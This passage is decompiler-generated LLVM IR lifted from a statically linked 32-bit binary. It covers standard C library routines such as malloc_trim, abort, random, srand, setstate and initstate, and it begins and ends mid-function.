  %v5_8050fdd = load i32, i32* %v4_8050fdd, align 4
  store i32 %v5_8050fdd, i32* %eax.global-to-local, align 4
  %v3_8050fe1 = inttoptr i32 %v2_8050fdd to i32*
  store i32 %v1_8050fd2, i32* %v3_8050fe1, align 4
  %v0_8050fe4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050fe4 = urem i32 %v0_8050fe4, 2
  %v2_8050fe4 = icmp eq i32 %v1_8050fe4, 0
  store i32 %v1_8050fe4, i32* %eax.global-to-local, align 4
  %v1_8050fe9 = icmp eq i1 %v2_8050fe4, false
  br i1 %v1_8050fe9, label %dec_label_pc_805100a, label %dec_label_pc_8050feb

dec_label_pc_8050feb:                             ; preds = %dec_label_pc_8050fdd
  %v0_8050feb = load i32, i32* @esi, align 4
  %v1_8050feb = add i32 %v0_8050feb, 8
  %v2_8050feb = inttoptr i32 %v1_8050feb to i32*
  %v3_8050feb = load i32, i32* %v2_8050feb, align 4
  store i32 %v3_8050feb, i32* @edx, align 4
  %v1_8050fee = add i32 %v0_8050feb, 12
  %v2_8050fee = inttoptr i32 %v1_8050fee to i32*
  %v3_8050fee = load i32, i32* %v2_8050fee, align 4
  store i32 %v3_8050fee, i32* %eax.global-to-local, align 4
  %v1_8050ff1 = add i32 %v3_8050feb, 12
  %v2_8050ff1 = inttoptr i32 %v1_8050ff1 to i32*
  %v3_8050ff1 = load i32, i32* %v2_8050ff1, align 4
  store i32 %v3_8050ff1, i32* @edi, align 4
  %v12_8050ff4 = icmp eq i32 %v3_8050ff1, %v0_8050feb
  %v1_8050ff6 = icmp eq i1 %v12_8050ff4, false
  br i1 %v1_8050ff6, label %dec_label_pc_8050ffd, label %dec_label_pc_8050ff8

dec_label_pc_8050ff8:                             ; preds = %dec_label_pc_8050feb
  %v1_8050ff8 = add i32 %v3_8050fee, 8
  %v2_8050ff8 = inttoptr i32 %v1_8050ff8 to i32*
  %v3_8050ff8 = load i32, i32* %v2_8050ff8, align 4
  %v15_8050ff8 = icmp eq i32 %v3_8050ff8, %v3_8050ff1
  br i1 %v15_8050ff8, label %dec_label_pc_8051002, label %dec_label_pc_8050ffd

dec_label_pc_8050ffd:                             ; preds = %dec_label_pc_8050ff8, %dec_label_pc_8050feb, %dec_label_pc_8050fc1, %dec_label_pc_8050fad
  %v0_8050ffd = call i32 @abort()
  store i32 %v0_8050ffd, i32* %eax.global-to-local, align 4
  %v1_8051002.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8051002

dec_label_pc_8051002:                             ; preds = %dec_label_pc_8050ff8, %dec_label_pc_8050ffd
  %v1_8051002 = phi i32 [ %v3_8050feb, %dec_label_pc_8050ff8 ], [ %v1_8051002.pre, %dec_label_pc_8050ffd ]
  %v0_8051002 = phi i32 [ %v3_8050fee, %dec_label_pc_8050ff8 ], [ %v0_8050ffd, %dec_label_pc_8050ffd ]
  %v2_8051002 = add i32 %v1_8051002, 12
  %v3_8051002 = inttoptr i32 %v2_8051002 to i32*
  store i32 %v0_8051002, i32* %v3_8051002, align 4
  %v0_8051005 = load i32, i32* @ebx, align 4
  %v1_8051005 = load i32, i32* @ebp, align 4
  %v2_8051005 = add i32 %v1_8051005, %v0_8051005
  store i32 %v2_8051005, i32* @ebx, align 4
  %v0_8051007 = load i32, i32* @edx, align 4
  %v1_8051007 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051007 = add i32 %v1_8051007, 8
  %v3_8051007 = inttoptr i32 %v2_8051007 to i32*
  store i32 %v0_8051007, i32* %v3_8051007, align 4
  br label %dec_label_pc_805100a

dec_label_pc_805100a:                             ; preds = %dec_label_pc_8050fdd, %dec_label_pc_8051002
  %v0_805100a = load i32, i32* @global_var_8060a3c.207, align 4
  store i32 %v0_805100a, i32* %eax.global-to-local, align 4
  %v0_805100f = load i32, i32* @ecx, align 4
  %v1_805100f = add i32 %v0_805100f, 12
  %v2_805100f = inttoptr i32 %v1_805100f to i32*
  store i32 ptrtoint (i32* @global_var_8060a34.191 to i32), i32* %v2_805100f, align 4
  %v0_8051016 = load i32, i32* @ebx, align 4
  %v1_8051016 = load i32, i32* @ecx, align 4
  %v3_8051016 = add i32 %v1_8051016, %v0_8051016
  %v4_8051016 = inttoptr i32 %v3_8051016 to i32*
  store i32 %v0_8051016, i32* %v4_8051016, align 4
  %v0_8051019 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051019 = load i32, i32* @ecx, align 4
  %v2_8051019 = add i32 %v1_8051019, 8
  %v3_8051019 = inttoptr i32 %v2_8051019 to i32*
  store i32 %v0_8051019, i32* %v3_8051019, align 4
  %v0_805101c = load i32, i32* @ecx, align 4
  %v1_805101c = load i32, i32* %eax.global-to-local, align 4
  %v2_805101c = add i32 %v1_805101c, 12
  %v3_805101c = inttoptr i32 %v2_805101c to i32*
  store i32 %v0_805101c, i32* %v3_805101c, align 4
  %v0_805101f = load i32, i32* @ebx, align 4
  %v1_8051021 = or i32 %v0_805101f, 1
  store i32 %v1_8051021, i32* %eax.global-to-local, align 4
  %v0_8051024 = load i32, i32* @ecx, align 4
  store i32 %v0_8051024, i32* @global_var_8060a3c.207, align 4
  %v2_805102a = add i32 %v0_8051024, 4
  %v3_805102a = inttoptr i32 %v2_805102a to i32*
  store i32 %v1_8051021, i32* %v3_805102a, align 4
  br label %dec_label_pc_805103f

dec_label_pc_805102f:                             ; preds = %dec_label_pc_8050fce
  %v0_805102f = load i32, i32* @ebx, align 4
  %v2_805102f = add i32 %v0_805102f, %v1_8050fd2
  store i32 %v2_805102f, i32* @ebx, align 4
  %v1_8051033 = or i32 %v2_805102f, 1
  store i32 %v1_8051033, i32* %eax.global-to-local, align 4
  %v1_8051036 = load i32, i32* @ecx, align 4
  %v2_8051036 = add i32 %v1_8051036, 4
  %v3_8051036 = inttoptr i32 %v2_8051036 to i32*
  store i32 %v1_8051033, i32* %v3_8051036, align 4
  %v0_8051039 = load i32, i32* @ecx, align 4
  store i32 %v0_8051039, i32* @global_var_8060a2c.189, align 4
  br label %dec_label_pc_805103f

dec_label_pc_805103f:                             ; preds = %dec_label_pc_805100a, %dec_label_pc_805102f
  %v0_805103f = load i32, i32* @ebx, align 4
  %tmp = icmp ult i32 %v0_805103f, 131072
  br i1 %tmp, label %dec_label_pc_80510a4, label %dec_label_pc_8051047

dec_label_pc_8051047:                             ; preds = %dec_label_pc_805103f
  %v0_8051047 = load i8, i8* @global_var_8060a00.188, align 512
  %v1_8051047 = and i8 %v0_8051047, 2
  %v2_8051047 = icmp eq i8 %v1_8051047, 0
  br i1 %v2_8051047, label %dec_label_pc_8051060, label %dec_label_pc_8051050

dec_label_pc_8051050:                             ; preds = %dec_label_pc_8051047
  %v2_8051058 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8060a00.188 to i32*))
  store i32 %v2_8051058, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051060

dec_label_pc_8051060:                             ; preds = %dec_label_pc_8051047, %dec_label_pc_8051050
  %v0_8051060 = load i32, i32* @global_var_8060a2c.189, align 4
  store i32 %v0_8051060, i32* %eax.global-to-local, align 4
  %v1_8051065 = add i32 %v0_8051060, 4
  %v2_8051065 = inttoptr i32 %v1_8051065 to i32*
  %v3_8051065 = load i32, i32* %v2_8051065, align 4
  %v1_8051068 = and i32 %v3_8051065, -4
  store i32 %v1_8051068, i32* %eax.global-to-local, align 4
  %v1_805106b = load i32, i32* @global_var_8060d44.205, align 4
  %v7_805106b = icmp ult i32 %v1_8051068, %v1_805106b
  br i1 %v7_805106b, label %dec_label_pc_80510a4, label %dec_label_pc_8051073

dec_label_pc_8051073:                             ; preds = %dec_label_pc_8051060
  %v0_8051073 = load i32, i32* @global_var_8060d48.203, align 8
  store i32 %v0_8051073, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32* @edx, align 4
  %v0_805107d = call i32 @__malloc_trim()
  store i32 %v0_805107d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510a4

dec_label_pc_8051084:                             ; preds = %dec_label_pc_8050f8c
  %v2_8051084 = inttoptr i32 %v1_8050f55 to i32*
  %v3_8051084 = load i32, i32* %v2_8051084, align 4
  %v0_8051087 = load i32, i32* @global_var_8060d50.196, align 16
  %v1_8051087 = add i32 %v0_8051087, -1
  store i32 %v1_8051087, i32* @global_var_8060d50.196, align 16
  %v2_805108d = add i32 %v3_8051084, %v1_8050f65
  store i32 %v2_805108d, i32* %eax.global-to-local, align 4
  %v2_8051090 = sub i32 %v1_8050f55, %v3_8051084
  %v0_8051096 = load i32, i32* @global_var_8060d64.200, align 4
  %v2_8051096 = sub i32 %v0_8051096, %v2_805108d
  store i32 %v2_8051096, i32* @global_var_8060d64.200, align 4
  %v4_805109c = call i32 @munmap(i32 %v2_8051090, i32 %v2_805108d, i32 %v1_8050f65, i32 %v1_8050f65)
  store i32 %v4_805109c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510a4

dec_label_pc_80510a4:                             ; preds = %dec_label_pc_8051060, %dec_label_pc_805103f, %dec_label_pc_8051073, %dec_label_pc_8050f6c, %dec_label_pc_8051084
  store i32 %v2_8050f3f, i32* @eax, align 4
  %v2_80510ad = call i32 @__pthread_return_void(i32 %v2_8050f3f, i32 1)
  store i32 %v2_80510ad, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510b5

dec_label_pc_80510b5:                             ; preds = %entry, %dec_label_pc_80510a4
  %.0 = phi i32 [ undef, %entry ], [ %v2_80510ad, %dec_label_pc_80510a4 ]
  store i32 %v0_8050f24, i32* @ebx, align 4
  store i32 %v0_8050f23, i32* @esi, align 4
  store i32 %v0_8050f22, i32* @edi, align 4
  store i32 %v0_8050f21, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8051084, { 1, 0 }
  uselistorder i32 %v0_8051016, { 1, 0 }
  uselistorder i32 %v1_8050fe4, { 1, 0 }
  uselistorder i32 %v2_8050fdd, { 1, 0 }
  uselistorder i32 %v1_8050fd2, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050fe1, { 1, 0 }
  uselistorder i32 %v1_8050f65, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8050f5d, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8050f55, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8060a00.188 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8060a34.191 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_8060a2c.189, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_805a590.187 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 0, 3, 4, 2, 1 }
  uselistorder label %dec_label_pc_80510b5, { 1, 0 }
  uselistorder label %dec_label_pc_80510a4, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8051060, { 1, 0 }
  uselistorder label %dec_label_pc_805103f, { 1, 0 }
  uselistorder label %dec_label_pc_805100a, { 1, 0 }
  uselistorder label %dec_label_pc_8051002, { 1, 0 }
  uselistorder label %dec_label_pc_8050fce, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80510bd = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_80510ca = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8060a00.188 to i8) to i32) to i32*))
  store i32 ptrtoint (i8* @global_var_8060a00.188 to i32), i32* @edx, align 4
  %v0_80510d7 = load i32, i32* @ebx, align 4
  store i32 %v0_80510d7, i32* @eax, align 4
  store i32 %v0_80510bd, i32* @ebx, align 4
  %v0_80510da = call i32 @__malloc_trim()
  ret i32 %v0_80510da

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8060a00.188 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8060a00.188, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_80510ec = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5a8.208 to i32))
  %v12_80510f6 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80510fb

dec_label_pc_80510fb:                             ; preds = %dec_label_pc_80510fb.dec_label_pc_80510fb_crit_edge, %entry
  %v0_80510fb = phi i32 [ %v12_80510f6, %entry ], [ %v0_80510fb.pre, %dec_label_pc_80510fb.dec_label_pc_80510fb_crit_edge ]
  %v1_805110619 = phi i32 [ 31, %entry ], [ %v1_8051106, %dec_label_pc_80510fb.dec_label_pc_80510fb_crit_edge ]
  %v2_80510fb = mul i32 %v1_805110619, 4
  %v3_80510fb = add i32 %v2_80510fb, 152
  %v4_80510fb = add i32 %v3_80510fb, %v0_80510fb
  %v5_80510fb = inttoptr i32 %v4_80510fb to i32*
  store i32 0, i32* %v5_80510fb, align 4
  %v0_8051106.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8051106 = add i32 %v0_8051106.pre, -1
  %v9_8051106 = icmp slt i32 %v1_8051106, 0
  store i32 %v1_8051106, i32* %eax.global-to-local, align 4
  %v1_8051107 = icmp eq i1 %v9_8051106, false
  br i1 %v1_8051107, label %dec_label_pc_80510fb.dec_label_pc_80510fb_crit_edge, label %dec_label_pc_8051109

dec_label_pc_80510fb.dec_label_pc_80510fb_crit_edge: ; preds = %dec_label_pc_80510fb
  %v0_80510fb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80510fb

dec_label_pc_8051109:                             ; preds = %dec_label_pc_80510fb
  %v0_8051109 = load i32, i32* @ebx, align 4
  %v2_805110d = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_805110d, i32* @ebx, align 4
  %v4_8051115 = call i32 @__sigaddset(i32 %v2_805110d, i32 6, i32 %v0_8051109, i32 %v0_8051109)
  store i32 %v4_8051115, i32* %eax.global-to-local, align 4
  %v1_805111d = icmp eq i32 %v4_8051115, 0
  %v1_805111f = icmp eq i1 %v1_805111d, false
  br i1 %v1_805111f, label %dec_label_pc_805112f, label %dec_label_pc_8051121

dec_label_pc_8051121:                             ; preds = %dec_label_pc_8051109
  %v3_8051127 = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_8051127 = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_8051127, i32 0)
  store i32 %v4_8051127, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805112f

dec_label_pc_805112f:                             ; preds = %dec_label_pc_8051109, %dec_label_pc_8051121
  %v2_80511674 = phi i32 [ %v4_8051115, %dec_label_pc_8051109 ], [ %v4_8051127, %dec_label_pc_8051121 ]
  %v0_805112f = load i8, i8* @global_var_8060920.209, align 32
  %v1_805112f = icmp eq i8 %v0_805112f, 0
  %v1_8051136 = icmp eq i1 %v1_805112f, false
  br i1 %v1_8051136, label %dec_label_pc_8051167, label %dec_label_pc_8051138

dec_label_pc_8051138:                             ; preds = %dec_label_pc_805112f
  store i8 1, i8* @global_var_8060920.209, align 32
  br label %dec_label_pc_805113f

dec_label_pc_805113f:                             ; preds = %dec_label_pc_80511a6, %dec_label_pc_8051138
  %v1_8051147 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5a8.208 to i32))
  store i32 %v1_8051147, i32* %eax.global-to-local, align 4
  %v1_8051153 = call i32 @__raise(i32 6)
  store i32 %v1_8051153, i32* %eax.global-to-local, align 4
  %v1_805115f = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5a8.208 to i32))
  store i32 %v1_805115f, i32* %eax.global-to-local, align 4
  %v0_8051167.pre = load i8, i8* @global_var_8060920.209, align 32
  br label %dec_label_pc_8051167

dec_label_pc_8051167:                             ; preds = %dec_label_pc_805112f, %dec_label_pc_805113f
  %v2_8051167 = phi i32 [ %v2_80511674, %dec_label_pc_805112f ], [ %v1_805115f, %dec_label_pc_805113f ]
  %v0_8051167 = phi i8 [ %v0_805112f, %dec_label_pc_805112f ], [ %v0_8051167.pre, %dec_label_pc_805113f ]
  %v1_8051167 = zext i8 %v0_8051167 to i32
  %v3_8051167 = and i32 %v2_8051167, -256
  %v4_8051167 = or i32 %v1_8051167, %v3_8051167
  store i32 %v4_8051167, i32* %eax.global-to-local, align 4
  %v10_805116c = icmp eq i8 %v0_8051167, 1
  %v1_805116e = icmp eq i1 %v10_805116c, false
  br i1 %v1_805116e, label %dec_label_pc_80511c8, label %dec_label_pc_8051170

dec_label_pc_8051170:                             ; preds = %dec_label_pc_8051167
  %v2_8051178 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8051178, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_8060920.209, align 32
  %v3_8051184 = bitcast i32* %stack_var_-272 to i8*
  %v4_8051184 = call i32 @__GI_memset(i8* %v3_8051184, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805119b

dec_label_pc_805119b:                             ; preds = %dec_label_pc_805119b.dec_label_pc_805119b_crit_edge, %dec_label_pc_8051170
  %v0_805119b = phi i32 [ %v12_80510f6, %dec_label_pc_8051170 ], [ %v0_805119b.pre, %dec_label_pc_805119b.dec_label_pc_805119b_crit_edge ]
  %v1_80511a318 = phi i32 [ 31, %dec_label_pc_8051170 ], [ %v1_80511a3, %dec_label_pc_805119b.dec_label_pc_805119b_crit_edge ]
  %v2_805119b = mul i32 %v1_80511a318, 4
  %v3_805119b = add i32 %v2_805119b, 16
  %v4_805119b = add i32 %v3_805119b, %v0_805119b
  %v5_805119b = inttoptr i32 %v4_805119b to i32*
  store i32 -1, i32* %v5_805119b, align 4
  %v0_80511a3.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80511a3 = add i32 %v0_80511a3.pre, -1
  %v9_80511a3 = icmp slt i32 %v1_80511a3, 0
  store i32 %v1_80511a3, i32* %eax.global-to-local, align 4
  %v1_80511a4 = icmp eq i1 %v9_80511a3, false
  br i1 %v1_80511a4, label %dec_label_pc_805119b.dec_label_pc_805119b_crit_edge, label %dec_label_pc_80511a6

dec_label_pc_805119b.dec_label_pc_805119b_crit_edge: ; preds = %dec_label_pc_805119b
  %v0_805119b.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805119b

dec_label_pc_80511a6:                             ; preds = %dec_label_pc_805119b
  store i32 %v2_8051178, i32* %eax.global-to-local, align 4
  %v4_80511bb = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_80511bb, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805113f

dec_label_pc_80511c8:                             ; preds = %dec_label_pc_8051167
  %v10_80511c8 = icmp eq i8 %v0_8051167, 2
  %v1_80511ca = icmp eq i1 %v10_80511c8, false
  br i1 %v1_80511ca, label %dec_label_pc_80511d4, label %dec_label_pc_80511cc

dec_label_pc_80511cc:                             ; preds = %dec_label_pc_80511c8
  store i8 3, i8* @global_var_8060920.209, align 32
  br label %dec_label_pc_80511d4

dec_label_pc_80511d4:                             ; preds = %dec_label_pc_80511c8, %dec_label_pc_80511cc
  %v0_80511d4 = phi i8 [ %v0_8051167, %dec_label_pc_80511c8 ], [ 3, %dec_label_pc_80511cc ]
  %v9_80511d4 = icmp eq i8 %v0_80511d4, 3
  %v1_80511db = icmp eq i1 %v9_80511d4, false
  br i1 %v1_80511db, label %dec_label_pc_80511ee, label %dec_label_pc_80511dd

dec_label_pc_80511dd:                             ; preds = %dec_label_pc_80511d4
  store i8 4, i8* @global_var_8060920.209, align 32
  %v1_80511e9 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80511ee:                             ; preds = %dec_label_pc_80511d4, %dec_label_pc_80511ee
  br label %dec_label_pc_80511ee

; uselistorder directives
  uselistorder i32 %v1_80511a3, { 2, 1, 0 }
  uselistorder i8 %v0_8051167, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8051106, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 8, 7, 1, 9, 10, 11, 12, 13, 14, 2, 4, 3, 0 }
  uselistorder i8 3, { 0, 3, 5, 4, 1, 2 }
  uselistorder i8* @global_var_8060920.209, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80511ee, { 1, 0 }
  uselistorder label %dec_label_pc_80511d4, { 1, 0 }
  uselistorder label %dec_label_pc_8051167, { 1, 0 }
  uselistorder label %dec_label_pc_805112f, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_80511f4 = call i32 @random()
  ret i32 %v0_80511f4

; uselistorder directives
  uselistorder i32 ()* @random, { 11, 10, 9, 8, 3, 2, 1, 0, 7, 6, 5, 4 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80511fc = load i32, i32* @ebx, align 4
  store i32 %v0_80511fc, i32* %stack_var_-4, align 4
  %v2_805120a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805120a, i32* @ebx, align 4
  %v2_805120f = call i32 @__pthread_return_void(i32 %v2_805120a, i32 134552291)
  %v1_805121b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5c0.210 to i32))
  %v2_8051222 = ptrtoint i32* %stack_var_-8 to i32
  %v3_805122c = call i32 @__GI_random_r(i32* nonnull @global_var_805a5d8, i32 %v2_8051222)
  store i32 ptrtoint (i32* @global_var_805a5d8 to i32), i32* @eax, align 4
  %v2_8051236 = call i32 @__pthread_return_void(i32 %v2_805120a, i32 1)
  %v3_805123b = load i32, i32* %stack_var_-8, align 4
  %v2_8051242 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051242, i32* @ebx, align 4
  ret i32 %v3_805123b
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8051255 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8051255, i32* @eax, align 4
  %v2_805125a = call i32 @__pthread_return_void(i32 %v2_8051255, i32 134552291)
  %v1_8051266 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5c0.210 to i32))
  %v0_805126b = load i32, i32* bitcast (i32** @global_var_805a5e0.213 to i32*), align 32
  store i32 %v0_805126b, i32* @ebx, align 4
  %v3_805127c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805a5d8)
  %v2_8051284 = icmp slt i32 %v3_805127c, 0
  br i1 %v2_8051284, label %dec_label_pc_805128b, label %dec_label_pc_8051288

dec_label_pc_8051288:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_805a5dc.214 to i32), i32* @esi, align 4
  br label %dec_label_pc_805128b

dec_label_pc_805128b:                             ; preds = %entry, %dec_label_pc_8051288
  store i32 %v2_8051255, i32* @eax, align 4
  %v2_8051294 = call i32 @__pthread_return_void(i32 %v2_8051255, i32 1)
  %v0_805129c = load i32, i32* @esi, align 4
  ret i32 %v0_805129c

; uselistorder directives
  uselistorder label %dec_label_pc_805128b, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_80512b0 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80512b0, i32* @ebx, align 4
  %v2_80512b5 = call i32 @__pthread_return_void(i32 %v2_80512b0, i32 134552291)
  %v1_80512c1 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5c0.210 to i32))
  store i32 ptrtoint (i32** @global_var_805a5dc.214 to i32), i32* @esi, align 4
  %v4_80512e0 = inttoptr i32 %arg2 to i32*
  %v5_80512e0 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_80512e0, i32 %arg3, i32 ptrtoint (i32* @global_var_805a5d8 to i32))
  store i32 %v5_80512e0, i32* @eax, align 4
  %v2_80512eb = call i32 @__pthread_return_void(i32 %v2_80512b0, i32 1)
  %v0_80512f3 = load i32, i32* @esi, align 4
  ret i32 %v0_80512f3
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80512f8 = load i32, i32* @ebx, align 4
  store i32 %v0_80512f8, i32* %stack_var_-4, align 4
  %v2_8051306 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8051306, i32* @ebx, align 4
  %v2_805130b = call i32 @__pthread_return_void(i32 %v2_8051306, i32 134552291)
  %v1_8051317 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805a5c0.210 to i32))
  %v3_8051327 = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_805a5d8)
  store i32 ptrtoint (i32* @global_var_805a5d8 to i32), i32* @eax, align 4
  %v2_8051331 = call i32 @__pthread_return_void(i32 %v2_8051306, i32 1)
  %v2_8051339 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8051339, i32* @ebx, align 4
  ret i32 %v2_8051331

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_805a5d8 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_805a5d8, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_805133f = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_805134b = add i32 %tmp3, 12
  %v2_805134b = inttoptr i32 %v1_805134b to i32*
  %v3_805134b = load i32, i32* %v2_805134b, align 4
  store i32 %v3_805134b, i32* %ecx.global-to-local, align 4
  %v1_805134e = add i32 %arg1, 4
  store i32 %v1_805134e, i32* %esi.global-to-local, align 4
  %v1_8051351 = add i32 %tmp3, 8
  %v2_8051351 = inttoptr i32 %v1_8051351 to i32*
  %v3_8051351 = load i32, i32* %v2_8051351, align 4
  %v1_8051354 = icmp eq i32 %v3_805134b, 0
  %v1_8051356 = icmp eq i1 %v1_8051354, false
  br i1 %v1_8051356, label %dec_label_pc_8051361, label %dec_label_pc_8051358

dec_label_pc_8051358:                             ; preds = %entry
  %v1_8051358 = add i32 %v3_8051351, -4
  %v2_8051358 = inttoptr i32 %v1_8051358 to i32*
  store i32 0, i32* %v2_8051358, align 4
  br label %dec_label_pc_8051371

dec_label_pc_8051361:                             ; preds = %entry
  %v1_8051361 = add i32 %tmp3, 4
  %v2_8051361 = inttoptr i32 %v1_8051361 to i32*
  %v3_8051361 = load i32, i32* %v2_8051361, align 4
  %v2_8051364 = sub i32 %v3_8051361, %v3_8051351
  %v2_8051366 = sdiv i32 %v2_8051364, 4
  %v3_8051369 = mul i32 %v2_8051366, 5
  %v2_805136c = add i32 %v3_8051369, %v3_805134b
  store i32 %v2_805136c, i32* %eax.global-to-local, align 4
  %v2_805136e = add i32 %v3_8051351, -4
  %v3_805136e = inttoptr i32 %v2_805136e to i32*
  store i32 %v2_805136c, i32* %v3_805136e, align 4
  br label %dec_label_pc_8051371

dec_label_pc_8051371:                             ; preds = %dec_label_pc_8051358, %dec_label_pc_8051361
  %v0_8051371 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051371 = add i32 %v0_8051371, -4
  %v2_8051371 = inttoptr i32 %v1_8051371 to i32*
  %v3_8051371 = load i32, i32* %v2_8051371, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_8051379 = ashr i32 %v3_8051371, 31
  %v2_805137a = zext i32 %v3_8051371 to i64
  %v4_805137a = zext i32 %v1_8051379 to i64
  %v5_805137a = mul nuw i64 %v4_805137a, 4294967296
  %v6_805137a = or i64 %v5_805137a, %v2_805137a
  %v8_805137a = sdiv i64 %v6_805137a, 5
  %v9_805137a = trunc i64 %v8_805137a to i32
  store i32 %v9_805137a, i32* %eax.global-to-local, align 4
  %v10_805137a = srem i64 %v6_805137a, 5
  %v11_805137a = trunc i64 %v10_805137a to i32
  %v6_805137f = icmp ugt i32 %v11_805137a, 4
  br i1 %v6_805137f, label %dec_label_pc_80513bf, label %dec_label_pc_8051381

dec_label_pc_8051381:                             ; preds = %dec_label_pc_8051371
  %v1_8051381 = mul i32 %v11_805137a, 4
  %v2_8051381 = add i32 %v1_8051381, ptrtoint (i32* @global_var_8057f74.215 to i32)
  %v3_8051381 = inttoptr i32 %v2_8051381 to i32*
  %v4_8051381 = load i32, i32* %v3_8051381, align 4
  store i32 %v4_8051381, i32* %ecx.global-to-local, align 4
  %v1_8051388 = icmp eq i32 %v11_805137a, 0
